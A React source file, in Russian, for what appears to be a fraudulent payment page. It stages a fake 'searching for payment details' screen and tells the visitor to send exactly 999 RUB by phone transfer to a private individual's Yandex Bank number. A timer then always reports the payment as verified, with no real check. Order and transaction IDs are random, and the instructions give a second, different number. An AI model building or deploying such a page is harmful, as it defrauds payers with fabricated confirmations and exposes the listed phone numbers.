import React, { useState, useEffect } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from '@/components/ui/collapsible';
import Icon from '@/components/ui/icon';

type PaymentState = 'loading' | 'payment' | 'processing' | 'success' | 'cancelled' | 'expired';

const Index = () => {
  const [state, setState] = useState<PaymentState>('loading');
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [countdown, setCountdown] = useState(120); // 2 minutes
  const [expireCountdown, setExpireCountdown] = useState(600); // 10 minutes
  const [showInstructions, setShowInstructions] = useState(false);
  const [orderNumber] = useState(`df${Math.random().toString(36).substr(2, 6)}e1f-97ec-4bd8-b450-${Math.random().toString(36).substr(2, 12)}`);
  const [paymentId] = useState(Math.floor(Math.random() * 900000000) + 100000000);
  const [processingProgress, setProcessingProgress] = useState(0);

  // Loading animation
  useEffect(() => {
    if (state === 'loading') {
      const duration = Math.random() * 7000 + 8000; // 8-15 seconds
      const startTime = Date.now();
      
      const interval = setInterval(() => {
        const elapsed = Date.now() - startTime;
        const progress = Math.min((elapsed / duration) * 100, 100);
        
        setLoadingProgress(progress);
        
        if (progress >= 100) {
          clearInterval(interval);
          setState('payment');
        }
      }, 50);
      
      return () => clearInterval(interval);
    }
  }, [state]);

  // Countdown timer (starts immediately for loading and continues for payment)
  useEffect(() => {
    if (state === 'loading' || state === 'payment') {
      const timer = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 1) {
            clearInterval(timer);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [state]);

  // Expiration timer
  useEffect(() => {
    if (state === 'payment') {
      const timer = setTimeout(() => {
        setState('expired');
      }, 600000); // 10 minutes
      return () => clearTimeout(timer);
    }
  }, [state]);

  // Processing animation
  useEffect(() => {
    if (state === 'processing') {
      const duration = Math.random() * 3000 + 7000; // 7-10 seconds
      const interval = setInterval(() => {
        setProcessingProgress(prev => {
          const newProgress = prev + (100 / (duration / 100));
          if (newProgress >= 100) {
            clearInterval(interval);
            setState('success');
            return 100;
          }
          return newProgress;
        });
      }, 100);
      return () => clearInterval(interval);
    }
  }, [state]);

  const handlePaymentConfirm = () => {
    setState('processing');
    setProcessingProgress(0);
  };

  const handleCancel = () => {
    window.location.reload();
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const generateTransactionId = () => {
    return `TRX${Math.random().toString(36).substr(2, 9).toUpperCase()}${Date.now().toString().slice(-4)}`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-payment-blue-light to-white flex flex-col">
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          
          {/* Loading State */}
          {state === 'loading' && (
            <Card className="p-8 text-center animate-fade-in">
              <div className="mb-6">
                <div className="w-16 h-16 mx-auto mb-4 bg-payment-blue rounded-full flex items-center justify-center">
                  <Icon name="CreditCard" size={32} className="text-white" />
                </div>
                <h2 className="text-xl font-semibold text-payment-dark mb-2">
                  Заказ №{orderNumber}
                </h2>
                <p className="text-payment-gray">Поиск реквизитов для оплаты</p>
              </div>
              
              <div className="space-y-4">
                <div className="flex justify-center mb-4">
                  <div className="relative w-16 h-16">
                    <div className="absolute inset-0 border-4 border-payment-blue/20 rounded-full"></div>
                    <div className="absolute inset-0 border-4 border-transparent border-t-payment-blue rounded-full animate-spin"></div>
                    <div className="absolute inset-2 border-2 border-payment-blue/30 rounded-full"></div>
                    <div className="absolute inset-2 border-2 border-transparent border-t-payment-blue/60 rounded-full animate-spin" style={{ animationDirection: 'reverse', animationDuration: '0.8s' }}></div>
                  </div>
                </div>
                <div className="flex items-center justify-center gap-2">
                  <div className="w-2 h-2 bg-payment-blue rounded-full animate-pulse" />
                  <div className="w-2 h-2 bg-payment-blue rounded-full animate-pulse" style={{ animationDelay: '0.2s' }} />
                  <div className="w-2 h-2 bg-payment-blue rounded-full animate-pulse" style={{ animationDelay: '0.4s' }} />
                </div>
              </div>
              
              <div className="mt-4 p-3 bg-payment-blue-light rounded-lg">
                <p className="text-sm text-payment-dark">
                  Осталось времени: <span className="font-mono font-bold">{formatTime(countdown)}</span>
                </p>
              </div>
            </Card>
          )}

          {/* Payment Details State */}
          {state === 'payment' && (
            <div className="space-y-6 animate-fade-in">
              <Card className="p-6">
                <div className="text-center mb-6">
                  <div className="w-12 h-12 mx-auto mb-3 bg-payment-success rounded-full flex items-center justify-center">
                    <Icon name="Check" size={24} className="text-white" />
                  </div>
                  <h2 className="text-lg font-semibold text-payment-dark">Реквизиты найдены</h2>
                </div>

                <div className="bg-payment-warning/10 border border-payment-warning/30 rounded-lg p-4 mb-6">
                  <p className="text-sm font-medium text-payment-dark text-center">
                    Переводите точную сумму, иначе перевод не будет зачислен
                  </p>
                </div>

                <div className="space-y-4">
                  <div className="bg-gray-50 rounded-lg p-4">
                    <div className="grid grid-cols-2 gap-4 text-sm">
                      <div>
                        <p className="text-payment-gray">ID платежа:</p>
                        <p className="font-mono font-bold text-payment-dark">{paymentId}</p>
                      </div>
                      <div>
                        <p className="text-payment-gray">Сумма:</p>
                        <p className="font-bold text-payment-dark">999.00 RUB</p>
                      </div>
                    </div>
                  </div>

                  <div className="bg-payment-blue/5 border border-payment-blue/20 rounded-lg p-4">
                    <p className="text-sm text-payment-dark mb-3">
                      <strong>Переведите 999.00 RUB на указанный номер телефона:</strong>
                    </p>
                    
                    <div className="space-y-3">
                      <div className="flex justify-between items-center py-2 border-b border-gray-200">
                        <span className="text-sm text-payment-gray">Номер телефона:</span>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-bold">+7 981 848 79 57</span>
                          <Button 
                            size="sm" 
                            variant="outline"
                            onClick={() => navigator.clipboard.writeText('+79818487957')}
                          >
                            <Icon name="Copy" size={14} />
                          </Button>
                        </div>
                      </div>
                      
                      <div className="flex justify-between items-center py-2 border-b border-gray-200">
                        <span className="text-sm text-payment-gray">Сумма:</span>
                        <div className="flex items-center gap-2">
                          <span className="font-bold">999.00 RUB</span>
                          <Button 
                            size="sm" 
                            variant="outline"
                            onClick={() => navigator.clipboard.writeText('999')}
                          >
                            <Icon name="Copy" size={14} />
                          </Button>
                        </div>
                      </div>
                      
                      <div className="flex justify-between items-center py-2 border-b border-gray-200">
                        <span className="text-sm text-payment-gray">ФИО:</span>
                        <span className="font-medium">Людмила С.</span>
                      </div>
                      
                      <div className="flex justify-between items-center py-2">
                        <span className="text-sm text-payment-gray">Банк:</span>
                        <span className="font-medium">Яндекс Банк</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="space-y-2 mt-6 text-xs text-payment-gray">
                  <div className="flex items-start gap-2">
                    <Icon name="AlertTriangle" size={14} className="text-payment-warning mt-0.5" />
                    <p><strong>Важно!</strong> Переводите строго указанную сумму, иначе зачисление не будет произведено.</p>
                  </div>
                  <div className="flex items-start gap-2">
                    <Icon name="Info" size={14} className="text-payment-blue mt-0.5" />
                    <p><strong>Внимание,</strong> не указывайте комментарии к платежам.</p>
                  </div>
                  <div className="flex items-start gap-2">
                    <Icon name="CheckCircle" size={14} className="text-payment-success mt-0.5" />
                    <p>После перевода обязательно нажмите кнопку "Я оплатил"</p>
                  </div>
                </div>

                <div className="flex gap-3 mt-8">
                  <Button 
                    onClick={handlePaymentConfirm}
                    className="flex-1 bg-payment-success hover:bg-payment-success/90"
                  >
                    Я оплатил
                  </Button>
                  <Button 
                    variant="outline" 
                    onClick={handleCancel}
                    className="flex-1"
                  >
                    Отменить
                  </Button>
                </div>

                <Collapsible className="mt-6">
                  <CollapsibleTrigger asChild>
                    <Button variant="ghost" className="w-full text-sm">
                      <Icon name="FileText" size={16} className="mr-2" />
                      Инструкция по оплате
                      <Icon name="ChevronDown" size={16} className="ml-auto" />
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent>
                    <Card className="mt-2 p-4 bg-gray-50">
                      <h4 className="font-medium mb-3">Инструкция по оплате:</h4>
                      <ol className="text-sm space-y-2 text-payment-gray">
                        <li>1. Дождитесь выдачи реквизитов</li>
                        <li>2. Скопируйте номер +79960292921</li>
                        <li>3. Откройте приложение своего банка</li>
                        <li>4. Переводы по номеру телефона (СБП)</li>
                        <li>5. Вставьте номер телефона</li>
                        <li>6. Выберите банк: Яндекс Банк</li>
                        <li>7. Скопируйте сумму и сделайте перевод: 999 рублей</li>
                        <li>8. Переводите точную сумму, в противном случае перевод не будет зачислен</li>
                        <li>9. После выполненного перевода нажмите кнопку "Я оплатил" для подтверждения платежа в системе</li>
                      </ol>
                    </Card>
                  </CollapsibleContent>
                </Collapsible>
              </Card>
            </div>
          )}

          {/* Processing State */}
          {state === 'processing' && (
            <Card className="p-8 text-center animate-fade-in">
              <div className="mb-6">
                <div className="w-16 h-16 mx-auto mb-4 bg-payment-blue rounded-full flex items-center justify-center">
                  <Icon name="Loader2" size={32} className="text-white animate-spin" />
                </div>
                <h2 className="text-xl font-semibold text-payment-dark mb-2">
                  Проверка платежа
                </h2>
                <p className="text-payment-gray">Подождите, идет обработка...</p>
              </div>
              
              <Progress value={processingProgress} className="w-full" />
              <p className="text-sm text-payment-gray mt-2">
                Проверяем поступление средств
              </p>
            </Card>
          )}

          {/* Success State */}
          {state === 'success' && (
            <Card className="p-8 text-center animate-scale-in">
              <div className="mb-6">
                <div className="w-20 h-20 mx-auto mb-4 bg-payment-success rounded-full flex items-center justify-center">
                  <Icon name="CheckCircle" size={40} className="text-white" />
                </div>
                <h2 className="text-xl font-semibold text-payment-dark mb-2">
                  Платеж подтвержден
                </h2>
                <p className="text-payment-gray">Транзакция успешно обработана</p>
              </div>
              
              <div className="bg-payment-success/10 border border-payment-success/30 rounded-lg p-4 mb-6">
                <div className="text-sm space-y-2">
                  <div className="flex justify-between">
                    <span className="text-payment-gray">Номер транзакции:</span>
                    <span className="font-mono font-bold">{generateTransactionId()}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-payment-gray">Сумма:</span>
                    <span className="font-bold">999.00 RUB</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-payment-gray">Статус:</span>
                    <span className="text-payment-success font-medium">Зачислено</span>
                  </div>
                </div>
              </div>
              
              <Button onClick={handleCancel} className="w-full">
                Новый платеж
              </Button>
            </Card>
          )}

          {/* Expired State */}
          {state === 'expired' && (
            <Card className="p-8 text-center animate-fade-in">
              <div className="mb-6">
                <div className="w-16 h-16 mx-auto mb-4 bg-payment-danger rounded-full flex items-center justify-center">
                  <Icon name="Clock" size={32} className="text-white" />
                </div>
                <h2 className="text-xl font-semibold text-payment-dark mb-2">
                  Платеж отменён
                </h2>
                <p className="text-payment-gray">Время ожидания истекло</p>
              </div>
              
              <Button onClick={handleCancel} className="w-full">
                Повторить оплату
              </Button>
            </Card>
          )}

        </div>
      </div>

      {/* Footer */}
      <footer className="bg-black text-white py-4">
        <div className="text-center">
          <p className="text-xs text-gray-400">
            Платежный сервис по приему платежей. © 2025 (Оплата по системе быстрых платежей)
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Index;